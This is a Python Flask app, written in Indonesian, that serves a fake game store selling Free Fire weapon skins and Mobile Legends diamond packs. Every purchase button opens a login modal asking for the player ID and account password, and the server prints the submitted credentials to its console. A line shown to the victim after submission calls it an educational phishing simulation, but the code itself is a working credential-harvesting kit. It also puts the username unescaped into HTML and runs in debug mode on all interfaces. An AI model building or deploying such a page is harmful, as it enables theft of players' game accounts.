from flask import Flask, request, render_template_string

app = Flask(__name__)

# Menggabungkan HTML Game Store dengan Form Login dalam satu variabel string
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Store & Armory</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
        body { background-color: #0b0c10; background-image: radial-gradient(circle at center, #1f2833 0%, #0b0c10 100%); color: #ffffff; min-height: 100vh; padding: 40px 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .section-title { text-align: center; font-size: 32px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; text-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
        .section-title.ff { color: #ff4500; text-shadow: 0 0 15px rgba(255, 69, 0, 0.6); }
        .section-title.ml { color: #00ffff; text-shadow: 0 0 15px rgba(0, 255, 255, 0.6); margin-top: 50px; }
        .card-grid { display: flex; flex-wrap: wrap; gap: 25px; justify-content: center; }
        .card { background: linear-gradient(145deg, #1f2833, #151a22); border-radius: 12px; width: 280px; padding: 15px; position: relative; overflow: hidden; border: 1px solid #333; transition: all 0.3s ease; }
        .card:hover { transform: translateY(-10px) scale(1.02); z-index: 2; }
        .card.ff-card:hover { border-color: #ff4500; box-shadow: 0 10px 20px rgba(255, 69, 0, 0.4), inset 0 0 15px rgba(255, 69, 0, 0.2); }
        .card.ml-card:hover { border-color: #00ffff; box-shadow: 0 10px 20px rgba(0, 255, 255, 0.4), inset 0 0 15px rgba(0, 255, 255, 0.2); }
        .image-box { width: 100%; height: 160px; border-radius: 8px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; color: rgba(255, 255, 255, 0.8); position: relative; }
        .ff-card .image-box { background: linear-gradient(45deg, #8b0000, #ff4500); border: 2px solid #ffaa00; }
        .ml-card .image-box { background: linear-gradient(45deg, #00008b, #00ffff); border: 2px solid #00ffff; }
        .tier-tag { position: absolute; top: 10px; right: 10px; padding: 3px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .ff-card .tier-tag { background: #ffaa00; color: #000; }
        .ml-card .tier-tag { background: #ff00ff; color: #fff; }
        .item-name { font-size: 22px; font-weight: 700; margin-bottom: 5px; letter-spacing: 1px; }
        .item-desc { font-size: 14px; color: #c5c6c7; margin-bottom: 15px; min-height: 40px; }
        .price-row { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); }
        .price { font-size: 20px; font-weight: 700; }
        .ff-card .price { color: #ffaa00; }
        .ml-card .price { color: #00ffff; }
        .btn-buy { padding: 8px 20px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: all 0.2s; }
        .ff-card .btn-buy { background: linear-gradient(90deg, #ff4500, #ffaa00); color: white; }
        .ml-card .btn-buy { background: linear-gradient(90deg, #0055ff, #00ffff); color: white; }
        .btn-buy:active { transform: scale(0.95); }
        
        /* CSS Untuk Modal Login */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .modal-content { background: linear-gradient(145deg, #1f2833, #0b0c10); padding: 30px; border-radius: 12px; border: 1px solid #4285F4; width: 320px; text-align: center; box-shadow: 0 0 20px rgba(66, 133, 244, 0.4); }
        .modal-content h3 { color: #4285F4; margin-bottom: 10px; font-size: 24px; }
        .modal-content input { width: 100%; padding: 12px; margin: 10px 0; background: #151a22; border: 1px solid #333; color: white; border-radius: 5px; font-size: 16px; outline: none; }
        .modal-content input:focus { border-color: #4285F4; }
        .modal-content button { width: 100%; background: #4285F4; color: white; border: none; padding: 12px; font-weight: bold; font-size: 16px; cursor: pointer; border-radius: 5px; margin-top: 15px; text-transform: uppercase; }
        .modal-content button:hover { background: #3367d6; }
        .close-btn { color: #ff4500; cursor: pointer; margin-top: 15px; display: inline-block; font-weight: bold; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="container">
        <h2 class="section-title ff">Evo Gun Armory</h2>
        <div class="card-grid">
            <div class="card ff-card">
                <div class="image-box"><span class="tier-tag">Evo</span>AK47 - Blue Flame</div>
                <div class="item-name">Blue Flame Draco</div>
                <div class="item-desc">Senjata legendaris dengan damage api tambahan. Max level unlocks emote!</div>
                <div class="price-row">
                    <div class="price">💎 2,000</div>
                    <button class="btn-buy" onclick="openModal('Free Fire - Blue Flame Draco')">Beli</button>
                </div>
            </div>
            <div class="card ff-card">
                <div class="image-box"><span class="tier-tag">Mythic</span>M1887 - Rapper</div>
                <div class="item-name">Rapper Underworld</div>
                <div class="item-desc">Shotgun tersakit di jarak dekat dengan reload speed tinggi.</div>
                <div class="price-row">
                    <div class="price">💎 1,500</div>
                    <button class="btn-buy" onclick="openModal('Free Fire - Rapper Underworld')">Beli</button>
                </div>
            </div>
        </div>

        <h2 class="section-title ml">Diamond Vault</h2>
        <div class="card-grid">
            <div class="card ml-card">
                <div class="image-box"><span class="tier-tag">Hot</span>1000 💎</div>
                <div class="item-name">Paket Epic</div>
                <div class="item-desc">1000 Diamonds + 150 Bonus Diamonds. Cocok untuk beli skin Epic!</div>
                <div class="price-row">
                    <div class="price">Rp 250.000</div>
                    <button class="btn-buy" onclick="openModal('MLBB - Paket Epic 1000 DM')">Top Up</button>
                </div>
            </div>
            <div class="card ml-card">
                <div class="image-box"><span class="tier-tag">Best Value</span>5000 💎</div>
                <div class="item-name">Paket Legend</div>
                <div class="item-desc">5000 Diamonds + 800 Bonus Diamonds. Persiapan untuk event gacha!</div>
                <div class="price-row">
                    <div class="price">Rp 1.200.000</div>
                    <button class="btn-buy" onclick="openModal('MLBB - Paket Legend 5000 DM')">Top Up</button>
                </div>
            </div>
        </div>
    </div>

    <div id="loginModal" class="modal">
        <div class="modal-content">
            <h3>Konfirmasi Akun</h3>
            <p style="font-size: 14px; color: #aaa; margin-bottom: 15px;">Login untuk mengklaim <br><span id="itemName" style="color:white; font-weight:bold;">Item</span></p>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Player ID / Username" required>
                <input type="password" name="password" placeholder="Password Akun" required>
                <button type="submit">Proses Pembelian</button>
            </form>
            <span class="close-btn" onclick="closeModal()">BATAL</span>
        </div>
    </div>

    <script>
        function openModal(item) {
            document.getElementById('itemName').innerText = item;
            document.getElementById('loginModal').style.display = 'flex';
        }
        function closeModal() {
            document.getElementById('loginModal').style.display = 'none';
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Langsung me-render HTML dari variabel string di atas
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Mencetak data ke terminal console Python
    print("\n" + "="*50)
    print("[+] DATA DITERIMA (SIMULASI EDUKASI)")
    print(f"Username / ID : {username}")
    print(f"Password      : {password}")
    print("="*50 + "\n")
    
# Pesan sukses yang ditampilkan ke user di browser
    return f"""
    <div style="font-family: Arial; text-align: center; margin-top: 100px; background-color: #111; color: white; padding: 50px; border-radius: 10px;">
        <h2 style="color: #4285F4;">Terima kasih, {username}!</h2>
        <p>Data login Anda berhasil ditangkap oleh sistem.</p>
        <p style="color: #ff4500; font-weight: bold;">Ingat: Ini hanya simulasi untuk edukasi keamanan siber (Phishing).</p>
        <br>
        <a href="/" style="color: #00ffff; text-decoration: none; padding: 10px 20px; border: 1px solid #00ffff; border-radius: 5px;">Kembali ke Store</a>
    </div>
    <style>body {{ background-color: #000; }}</style>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)